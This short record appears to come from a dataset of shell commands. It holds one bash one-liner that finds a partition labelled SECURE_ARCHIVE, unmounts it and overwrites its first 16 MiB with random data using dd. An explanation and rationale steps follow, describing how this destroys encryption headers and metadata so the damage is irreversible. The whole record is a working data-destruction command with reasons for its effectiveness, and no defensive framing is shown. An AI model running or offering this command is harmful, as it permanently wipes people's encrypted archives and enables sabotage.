command: bash -c 'dev=$(blkid -L SECURE_ARCHIVE); [ -n "$dev" ] && { umount "$dev" 2>/dev/null || true; dd if=/dev/urandom of="$dev" bs=1M count=16 oflag=direct status=progress; }'
explanation: Corrupts a targeted encrypted/archive partition by overwriting the first 16 MiB, destroying critical metadata.
rationale_steps: Overwrite initial blocks where headers/metadata reside
Use random data for irreversible corruption
